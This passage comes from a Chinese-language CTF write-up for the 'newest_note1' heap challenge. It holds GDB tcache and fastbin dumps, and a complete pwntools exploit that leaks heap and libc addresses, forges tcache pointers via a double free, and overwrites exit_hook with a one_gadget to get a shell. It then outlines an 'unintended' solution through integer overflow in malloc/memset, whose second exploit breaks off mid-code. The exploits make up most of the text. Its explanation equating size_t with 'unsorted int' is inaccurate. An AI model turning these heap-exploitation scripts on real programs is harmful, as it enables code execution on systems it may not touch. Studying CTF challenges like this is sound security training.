<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @1</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">6</span>]: <span class="number">0x55630178c470</span> —▸ <span class="number">0x55630178c430</span> —▸ <span class="number">0x55630178c3f0</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> ◂— <span class="number">0x55630178c</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @2</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">5</span>]: <span class="number">0x55630178c430</span> —▸ <span class="number">0x55630178c3f0</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> ◂— <span class="number">0x55630178c</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @3</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">4</span>]: <span class="number">0x55630178c3f0</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> —▸ <span class="number">0x55630178c400</span> ◂— <span class="number">0x55630178c</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @4</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">3</span>]: <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> —▸ <span class="number">0x55630178c400</span> —▸ <span class="number">0x55630178c3a0</span> ◂— ...</span><br></pre></td></tr></table></figure>
<ul>
<li>这里把 fastchunk 的间隔从 64 变为了 96（0x400-0x3a0）</li>
<li>这是为了人为制造堆溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @5</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">2</span>]: <span class="number">0x55630178c370</span> —▸ <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> —▸ <span class="number">0x55630178c400</span> —▸ <span class="number">0x55630178c3a0</span> ◂— ...</span><br></pre></td></tr></table></figure>
<ul>
<li>这里又把 fastchunk 的间隔变为了 32（0x3a0-0x380）</li>
<li>造成了堆溢出</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @6</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">1</span>]: <span class="number">0x55630178c330</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> —▸ <span class="number">0x55630178c400</span> —▸ <span class="number">0x55630178c3a0</span> ◂— ...</span><br></pre></td></tr></table></figure>
<ul>
<li>0x370 就是攻击对象，我们需要修改它的 chunk-&gt;size</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @7</span></span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x55630178c4e0</span> —▸ <span class="number">0x55630178c480</span> —▸ <span class="number">0x55630178c440</span> —▸ <span class="number">0x55630178c400</span> —▸ <span class="number">0x55630178c3a0</span> ◂— ...</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @8</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">6</span>]: <span class="number">0x55630178c350</span> —▸ <span class="number">0x55630178c390</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c410</span> —▸ <span class="number">0x55630178c450</span> —▸ <span class="number">0x55630178c490</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在单独申请一个 fastbin 中的堆块后，由于 tcache 的机制，剩余未被申请的堆块会以倒序的方式重新被挂进 tcache bin 中 </li>
<li>在 GDB 中显示 tcache-&gt;next（溢出目标为：0x390 -&gt; 0x3b0）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @9</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">5</span>]: <span class="number">0x55630178c390</span> —▸ <span class="number">0x55630178c3b0</span> —▸ <span class="number">0x55630178c410</span> —▸ <span class="number">0x55630178c450</span> —▸ <span class="number">0x55630178c490</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>在 0x350 写入数据，一直溢出到 0x370 的 chunk-&gt;size </li>
</ul>
<p>最后是 get shell 的 exp 片段：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(key^(exit_hook-<span class="number">0x8</span>))) <span class="comment"># @1</span></span><br><span class="line">add(<span class="number">12</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment"># @2</span></span><br><span class="line">add(<span class="number">13</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(one_gadget)) <span class="comment"># @3</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;4. Exit&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>heap 排列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @0</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">5</span>]: <span class="number">0x55dc29f33390</span> —▸ <span class="number">0x55dc29f333b0</span> —▸ <span class="number">0x55dc29f33410</span> —▸ <span class="number">0x55dc29f33450</span> —▸ <span class="number">0x55dc29f33490</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55dc29f33360</span> —▸ <span class="number">0x7f9b86b4acc0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55dc29f33360</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @1</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">4</span>]: <span class="number">0x55dc29f333b0</span> —▸ <span class="number">0x7f9b86b4c6c0</span> (_IO_str_jumps+<span class="number">160</span>) ◂— <span class="number">0x7f9c7f2438fc</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcachebins <span class="comment">// @2</span></span><br><span class="line"><span class="number">0x40</span> [  <span class="number">3</span>]: <span class="number">0x7f9b86b4c6c0</span> (_IO_str_jumps+<span class="number">160</span>) ◂— <span class="number">0x7f9c7f2438fc</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：0x390 与 0x3b0 之间差了 32，是可以进行溢出的</li>
<li>所以直接在 0x3b0 中写入 exit_hook-0x8</li>
<li>申请到这片区域以后就可以写入 one_gadget</li>
</ul>
<p>我借鉴了一下他的思路，想改变一下他的 heap 布局，但是改来改去都不合适，感觉只有他这个是最合适的，还要注意一下 unsortedbin 相邻的下一个 chunk 必须存在（高版本 libc 的 free 会检查相邻下的两个 chunk 是否合法，如果是 top chunk 则另说）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x563874197360</span></span><br><span class="line">Size: <span class="number">0x441</span></span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5638741977a0</span></span><br><span class="line">Size: <span class="number">0x00</span></span><br></pre></td></tr></table></figure>
<ul>
<li>不合法的 unsorted chunk</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55b4c3312360</span></span><br><span class="line">Size: <span class="number">0x441</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55b4c33127a0</span></span><br><span class="line">Size: <span class="number">0x41</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55b4c33127e0</span></span><br><span class="line">Size: <span class="number">0x20821</span></span><br></pre></td></tr></table></figure>
<ul>
<li>合法的 unsorted chunk</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./newest_note1&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=gdb.debug(&#x27;./newest_note1&#x27;, &#x27;set debug-file-directory /home/yhellow/tools/debuglibc/2.34-0ubuntu3/usr/lib/debug/&#x27;)</span></span><br><span class="line">p=process(<span class="string">&quot;./newest_note1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will be? :&quot;</span>,<span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    add(i,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>) <span class="comment"># 为了unsorted chunk合法而做的堆风水</span></span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">heap_base = leak_addr&lt;&lt;<span class="number">12</span></span><br><span class="line">key = leak_addr</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,p64(key^(heap_base+<span class="number">0x480</span>)))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x440</span>)))</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x400</span>)))</span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x3a0</span>)))</span><br><span class="line">add(<span class="number">5</span>,p64(key^(heap_base+<span class="number">0x380</span>))) <span class="comment"># target:0x370</span></span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key^(heap_base+<span class="number">0x340</span>)))</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(key))</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x441</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x218cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">exit_hook = libc_base + <span class="number">0x21a6c8</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xeeccc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x41</span>)+p64(key^(exit_hook-<span class="number">0x8</span>)))</span><br><span class="line">add(<span class="number">11</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(one_gadget))</span><br><span class="line">  </span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>非预期解</strong></p>
<p>网上还有一种思路，利用了 malloc 和 memset 的特性：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;will be? :&quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br></pre></td></tr></table></figure>
<p>直接让 num_s 为 0x40040000，就可以让这个存堆指针的堆申请到 libc 上面，其实这里的 0x40040000*8 是有整形溢出的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;How many pages your notebook will be? :&quot;</span>);</span><br><span class="line">num_s = get_num(); <span class="comment">// num_s是int类型</span></span><br><span class="line"><span class="built_in">list</span> = <span class="built_in">malloc</span>(<span class="number">8</span> * num_s);</span><br><span class="line"><span class="built_in">memset</span>(<span class="built_in">list</span>, <span class="number">0</span>, <span class="number">8</span> * num_s);</span><br></pre></td></tr></table></figure>
<p>这里有个小细节要注意一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> size)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memset</span><span class="params">(<span class="keyword">void</span> *str, <span class="keyword">int</span> c, <span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>看上去 malloc 和 memset 可以接收8字节的数据，但是这里的 size_t 代表的是 unsorted int</li>
<li>案例如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* fd;</span><br><span class="line">    fd = <span class="built_in">malloc</span>(<span class="number">0x40040000</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fd,<span class="number">0</span>,<span class="number">0x40040000</span>*<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x40115e</span> &lt;main+<span class="number">8</span>&gt;     mov    edi, <span class="number">0x200000</span></span><br><span class="line">► <span class="number">0x401163</span> &lt;main+<span class="number">13</span>&gt;    call   <span class="built_in">malloc</span>@plt                      &lt;<span class="built_in">malloc</span>@plt&gt;</span><br><span class="line">       size: <span class="number">0x200000</span></span><br><span class="line">           </span><br><span class="line">► <span class="number">0x40117d</span> &lt;main+<span class="number">39</span>&gt;            call   <span class="built_in">memset</span>@plt                      &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">       s: <span class="number">0x7ffff7bbf010</span> ◂— <span class="number">0x0</span></span><br><span class="line">       c: <span class="number">0x0</span></span><br><span class="line">       n: <span class="number">0x200000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现，传入的是 0x40040000*8，GDB 上显示的却是 0x200000</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">35</span>]: <span class="built_in">bin</span>(<span class="number">0x40040000</span>*<span class="number">8</span>)</span><br><span class="line">Out[<span class="number">35</span>]: <span class="string">&#x27;0b1000000000001000000000000000000000&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: <span class="built_in">bin</span>(<span class="number">0x200000</span>)</span><br><span class="line">Out[<span class="number">36</span>]: <span class="string">&#x27;0b1000000000000000000000&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>很明显整数溢出了，说明这个 size_t 其实代表了4字节</li>
</ul>
<p>size_t 本来就是为了提高C语言的可移植性而诞生的，它在不同的场合可以有不同的功能，我们常常把 size_t 的大小当做“一字”，并用它来表示地址，但在以上这个场合中，size_t 就相当于是 unsorted int</p>
<ul>
<li>参考：<a target="_blank" rel="noopener" href="https://jeremybai.github.io/blog/2014/09/10/size-t">为什么size_t重要？- Jeremy’s blog (jeremybai.github.io)</a> </li>
</ul>
<p>知道了这个原理就可以直接 leak libc_base 了，节约了一次 free 的机会，然后 Double free 就可以了</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./newest_note1&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=gdb.debug(&#x27;./newest_note1&#x27;, &#x27;set debug-file-directory /home/yhellow/tools/debuglibc/2.34-0ubuntu3/usr/lib/debug/&#x27;)</span></span><br><span class="line">p=process(<span class="string">&quot;./newest_note1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;will be? :&quot;</span>,<span class="built_in">str</span>(<span class="number">0x40040000</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;: 